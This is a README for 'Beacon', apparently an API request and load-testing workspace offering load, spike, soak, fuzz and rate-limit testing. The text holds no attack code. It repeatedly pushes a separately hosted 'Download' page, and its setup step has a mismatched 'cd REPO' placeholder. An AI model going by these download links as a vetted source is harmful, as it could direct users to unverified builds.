# Beacon - API Testing and Load Testing Workspace 2026

> **Beacon is a browser-based API testing workspace for composing requests, automating workflows, examining responses, and measuring service behavior during load and rate-limit testing.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattmoore79/beacon-response-testing-hub?style=flat-square)](https://github.com/mattmoore79/beacon-response-testing-hub)

---

<p align="center">
  <a href="https://mattmoore79.github.io/beacon-response-testing-hub/">
    <img src="https://img.shields.io/badge/Download-Beacon%20Latest-brightgreen?style=for-the-badge" alt="Download Beacon">
  </a>
</p>

> **[Download Beacon](https://mattmoore79.github.io/beacon-response-testing-hub/)**

---

[Download Latest Build](https://mattmoore79.github.io/beacon-response-testing-hub/)

---

## What Beacon Provides

Beacon combines API discovery, repeatable request testing, and performance analysis in one workspace. Projects can contain nested request folders, reusable variables, dynamically assembled requests, and response inspection tools, allowing teams to keep their workflow in one place.

The workspace is built for developers and QA teams testing service endpoints, multi-step API workflows, and rate-limit responses. Existing Postman collections can be imported, while chained requests, assertions, JSON value extraction, retries, and multiple load-testing approaches support deeper API evaluation over time.

---

## Capabilities

- Arrange API work in project workspaces with folders nested to any required level.
- Store reusable values in environment-specific and global variable collections.
- Compose and modify requests with the dynamic request builder.
- Bring Postman collections into an existing Beacon workspace.
- Review response data and pull values from JSON payloads.
- Check response bodies and headers using configurable assertions.
- Assemble dependent API workflows with retry support.
- Test services with load, ramp, spike, soak, fuzz, and benchmark patterns.
- Follow active test metrics and export measurements for subsequent analysis.
- Run the Tauri desktop application for a local desktop-based workflow.
- Integrate supported workflows through the MCP server.

---

## Getting Started

First, clone the repository and move into its directory:

```bash
git clone https://github.com/mattmoore79/beacon-response-testing-hub.git
cd REPO
```

The project includes a React web interface and API functionality associated with FastAPI. Install the dependencies for the checked-out version, then launch the web and API services with the commands provided by that version of the project.

A Tauri configuration is also available for desktop use. Development and build commands can differ depending on the local environment, so review the repository scripts and dependency manifests before starting the application.

After the development server starts, visit the local address shown in the terminal.

---

## Typical Workflow

Beacon can be used in the following sequence:

1. Set up a project workspace for the service being tested.
2. Create folders for related API endpoints.
3. Add environment or global variables for hosts, authentication tokens, IDs, and other shared values.
4. Create requests with the builder and send them to examine their responses.
5. Define assertions for expected headers and response content.
6. Extract JSON values for use in subsequent requests.
7. Combine requests into a chained scenario and add retries as needed.
8. Choose a testing pattern, including ramp, spike, soak, fuzz, or benchmark testing.
9. Observe live metrics during execution.
10. Export the collected results for analysis or comparison.

Only test services and endpoints where you have the necessary authorization.

---

## Settings and Variables

Beacon uses project workspaces together with environment and global variables. Deployment-dependent values belong in an environment, while global variables are suitable for data shared by more than one project.

For example:

```text
Environment: staging
  API_BASE_URL: https://staging.example.test
  AUTH_TOKEN: <your-token>
  TEST_USER_ID: <your-test-user>

Global:
  REQUEST_TIMEOUT: <project-defined value>
```

Keep credentials and other confidential data out of shared repositories. MCP connections and desktop-specific behavior should be configured through the relevant project settings and runtime configuration files.

---

## Requirements

- A current web browser to use the React interface.
- An appropriate runtime for the repository's FastAPI and React components.
- Connectivity to the APIs under test.
- Authorized test endpoints and credentials.
- Extra desktop tooling for building or running the Tauri application.
- Enough local capacity for the chosen load, soak, spike, fuzz, or benchmark workload.
- Storage space for workspace data and exported test results.

---

## Frequently Asked Questions

### What kind of users is Beacon for?

Beacon supports developers and test teams that need to create API requests, automate multi-step flows, inspect responses, and study service behavior across several testing patterns.

### Can existing Postman collections be used?

Yes. Beacon can import Postman collections and add their request definitions to a project workspace.

### How should environment-specific values be stored?

Place deployment-specific settings in environment variables. Use global variables for values shared by multiple projects so request definitions remain reusable.

### Are multi-request chains supported?

Yes. Chained scenarios can connect successive requests using JSON extraction, response assertions, and retry settings.

### What test patterns does Beacon provide?

Available modes include load, ramp, spike, soak, fuzz, and benchmark testing. Beacon also supports rate-limit testing workflows and live metric monitoring.

### Does the project include a desktop version?

Yes. The repository includes a Tauri desktop application in addition to the web workflow. Follow the included desktop configuration and build guidance for local use.

### What can I verify when a request does not work?

Start by checking the URL, environment variables, authentication settings, network connectivity, and request headers. Next, examine the response and review configured assertions and extracted JSON values.

### Where can I find updates?

Review the repository for new builds, release updates, and configuration changes. When upgrading, reinstall or rebuild the current version using the repository's setup instructions.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
